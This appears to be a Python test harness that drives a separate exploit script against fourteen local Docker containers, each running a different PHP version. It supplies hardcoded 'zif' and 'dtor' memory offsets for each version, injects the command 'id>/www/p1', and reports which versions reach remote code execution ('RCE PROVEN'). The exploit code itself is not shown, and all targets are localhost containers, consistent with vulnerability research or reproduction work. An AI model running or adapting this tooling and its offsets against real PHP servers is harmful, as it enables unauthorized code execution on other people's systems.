import subprocess, sys, time
BASE = r"C:\Users\likat\p2s52704"
VERS = [
    ("p2s5445", "18101", "0x2f2e20", "0x3cd750"),
    ("p2s5538", "18102", "0x357e70", "0x438b80"),
    ("p2s5640", "18103", "0x378e80", "0x466920"),
    ("p2s7033", "18104", "0x3948d0", "0x47b7b0"),
    ("p2s7133", "18105", "0x300420", "0x3e6f60"),
    ("p2s7234", "18106", "0x3624e0", "0x451010"),
    ("p2s7333", "18107", "0x35f640", "0x440dc0"),
    ("p2s7433", "18108", "0x335850", "0x417d60"),
    ("p2s8030", "18109", "0x3495d0", "0x4319a0"),
    ("p2s8132", "18110", "0x36b080", "0x450690"),
    ("p2s8234", "18111", "0x39b8a0", "0x487650"),
    ("p2s8335", "18112", "0x3ac080", "0x49ec50"),
    ("p2s8426", "18113", "0x465370", "0x65eb60"),
    ("p2s8511", "18114", "0x5996e0", "0x7b47a0"),
]
ATTEMPTS = 5

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def deploy_clean(c):
    # remove php_value overrides entirely; ini-only config
    sh(f'docker exec {c} sh -c "a2dismod php-exploit 2>/dev/null; rm -f /etc/apache2/conf-enabled/php-exploit.conf /etc/apache2/conf.d/php-exploit.conf /etc/apache2/conf-available/php-exploit.conf /usr/local/etc/php/conf.d/99_p2s_exploit.ini 2>/dev/null"')
    sh(f'docker cp {BASE}\\p2s1000.ini {c}:/usr/local/etc/php/conf.d/99_p2s.ini')
    sh(f'docker exec {c} sh -c "ln -sf /var/www/html /www 2>/dev/null"')

def clean_state(c):
    sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 /var/www/html/chk.php /tmp/php* 2>/dev/null"')
    sh(f'docker restart {c}')
    time.sleep(3.0)

def verify(c):
    sh(f'docker cp {BASE}\\chk.php {c}:/var/www/html/chk.php')
    out = sh(f'docker exec {c} curl -s http://127.0.0.1/chk.php').stdout.strip()
    sh(f'docker exec {c} rm -f /var/www/html/chk.php')
    ok = ("max_input_vars=1000" in out) and ("max_input_vars=10000" not in out)
    return ok, out

def run_exploit(c, port, zif, dtor):
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--retries", "2",
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    return out

def main():
    only = sys.argv[1:] if len(sys.argv) > 1 else None
    results = []
    for c, port, zif, dtor in VERS:
        if only and c not in only:
            continue
        deploy_clean(c)
        okcfg, cfg = verify(c)
        print(f"\n=== {c} (port {port}) cfg_ok={okcfg} ===", flush=True)
        landed = False
        stage = "?"
        for a in range(1, ATTEMPTS + 1):
            clean_state(c)
            out = run_exploit(c, port, zif, dtor)
            stage = "stage1"
            if "stage 2" in out: stage = "stage2"
            if "stage 3" in out: stage = "stage3"
            if "uid=33" in out:
                proof = sh(f'docker exec {c} cat /www/p1').stdout.strip()
                print(f"  [att {a}] *** RCE *** {proof[:50]}", flush=True)
                landed = True
                break
            print(f"  [att {a}] no (reached {stage})", flush=True)
        results.append((c, landed, stage))
    print("\n" + "=" * 55)
    ok = [r[0] for r in results if r[1]]
    print(f"RCE PROVEN ({len(ok)}/{len(results)}):")
    for c, l, s in results:
        print(f"  {c:10s} {'YES' if l else 'no (reached '+s+')'}")

if __name__ == "__main__":
    main()
